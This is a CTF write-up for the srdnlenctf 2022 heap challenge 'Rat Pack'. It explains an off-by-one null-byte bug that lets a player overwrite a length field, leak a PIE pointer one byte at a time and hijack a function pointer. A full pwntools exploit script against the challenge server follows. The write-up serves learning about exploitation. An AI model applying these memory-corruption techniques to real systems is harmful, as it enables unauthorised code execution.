# srdnlenctf 2022

## Rat Pack (11 solves)

A fairly standard heap-based pwn challenge.
Easier to exploit because the execution target is in the base offset.
It's possible to perform unlimited operations, but only a number
of simultaneous allocations.

The flag is a text file in the same folder as the binary.

### Solution

There is a combination of three bugs in the string termination function.
An off by one error in strings that are len-1 long (but not len)
allows you to write a null byte one byte too far.
This allows us to inject a null byte into the length field,
and due to the way the length check is implemented, the next write can be of arbitrary length.
It can be useful to note that for strings of exactly max length the program does not terminate the string at all.

With this primitive, you can allocate a new chunk and overwrite a function pointer
in the new chunk's structure. This gives you execution.

Finding an execution target is easy: in the current version, the binary has a win function.
The binary is PIE, but win() is on the same segment as dialogue(). Therefore we can use
a quirk of the print bug (incorrectly terminating one character
ahead of the actual end if we are below max length) to leak the base offset one byte at a time.
This process will overwrite the next byte with a null byte, so you will need three chunks in total.

This is the easiest way. It's also possible to attack the length parameter more explicitly by
setting a max length with the first arbitrary write.
This allows to leak the entire pointer in one go by setting the length parameter
to exactly the overflow length with a previous write,
and then to only change the page+offset bytes instead of the whole pointer by setting it to the right value.

### Exploit

```python
from pwn import *

e = ELF('./rats')

dialogue_offset = e.functions._Z8dialogueP3rat.address
print(hex(dialogue_offset))



# r = process('./rats')
r = remote('rats.challs.srdnlen.it', 10300)

# Exploit method: single byte leak

# Reach exploit portion: Allocate three rats.
# First rat has 15 character long name.
# Second rat is there to trigger the bug and leak 4 even bytes.
# Third rat leaks 4 odd bytes
r.writeline(b'1')
r.readuntil(b'a name')
r.writeline(b'123456789012345')
r.readuntil(b'Quit.')
r.writeline(b'1')
r.readuntil(b'a name')
r.writeline(b'123456789012345')
r.readuntil(b'Quit.')
r.writeline(b'1')
r.readuntil(b'a name')
r.writeline(b'victim2')
r.readuntil(b'Quit.')

full_pointer = 0

# Leak one byte at a time

# start with victim 2's odd bytes
for i in range(4):
    r.writeline(b'3')
    r.readuntil(b'number')
    r.writeline(b'1')
    r.readuntil(b'a name')
    payload = b'z'*(40+2*i + 1)
    r.writeline(payload)
    r.readuntil(b'Quit.')
    r.writeline(b'2')
    r.readuntil(b'number')
    r.writeline(b'1')
    r.readuntil(payload)
    byteleak = r.readline()
    print(byteleak)
    if byteleak==b'.\n': # String is terminated without leak = leaked byte is null
        byteleak = [0]
    print(hex(byteleak[0]))
    full_pointer += byteleak[0]<<(8*(2*i + 1))

# Continue with victim 1's even bytes
for i in range(4):
    r.writeline(b'3')
    r.readuntil(b'number')
    r.writeline(b'0')
    r.readuntil(b'a name')
    payload = b'z'*(40+2*i)
    r.writeline(payload)
    r.readuntil(b'Quit.')
    r.writeline(b'2')
    r.readuntil(b'number')
    r.writeline(b'0')
    r.readuntil(payload)
    byteleak = r.readline()
    print(byteleak)
    if byteleak==b'.\n': # String is terminated without leak = leaked byte is null
        byteleak = [0]
    print(hex(byteleak[0]))
    full_pointer += byteleak[0]<<(8*2*i)

print(hex(full_pointer))
win_ptr = full_pointer - dialogue_offset + e.functions._Z3winv.address


# Execute win function!
r.writeline(b'3')
r.readuntil(b'number')
r.writeline(b'0')
r.readuntil(b'a name')
payload = b'z'*40 + p64(win_ptr)
r.writeline(payload)
r.readuntil(b'Quit.')
r.writeline(b'2')
r.readuntil(b'number')
r.writeline(b'1')
r.readuntil('srdnlen{')
flag = r.readuntil('}')
r.close()

print('srdnlen{' + flag.decode('utf8'))
```
